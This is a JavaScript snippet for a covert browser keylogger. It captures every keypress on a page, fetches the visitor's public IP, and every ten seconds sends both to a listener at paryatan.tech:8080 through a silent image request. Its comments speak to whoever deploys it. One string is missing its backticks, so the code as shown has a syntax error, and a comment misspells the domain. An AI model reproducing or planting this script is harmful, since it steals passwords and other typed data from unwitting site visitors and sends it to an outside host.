(function() {
    // !! CRITICAL: Replace [Your Public IP or Domain] with parutan.tech if configured !!
    const LISTENER_URL = 'https://paryatan.tech:8080/'; 
    let keys = '';
    let ip_address = 'N/A'; // Placeholder

    // Function to capture keys
    document.onkeypress = function(e) {
        keys += e.key;
    };

    // Function to capture IP and send data
    function exfiltrateData() {
        // Use a third-party service to get the external IP (client-side)
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                ip_address = data.ip || 'IP_FETCH_FAILED';
            })
            .catch(() => {
                ip_address = 'IP_FETCH_ERROR';
            })
            .finally(() => {
                // Send keys and IP to your listener server
                const dataToSend = keys=${encodeURIComponent(keys)}&ip=${encodeURIComponent(ip_address)};
                const fullUrl = LISTENER_URL + '?' + dataToSend;

                // Use a simple image request to exfiltrate the data silently
                new Image().src = fullUrl;

                // Reset keys for the next batch
                keys = '';
            });
    }

    // Send data every 10 seconds (adjust timing as needed)
    setInterval(exfiltrateData, 10000); 

    // Initial IP capture and data send on load
    exfiltrateData();
})();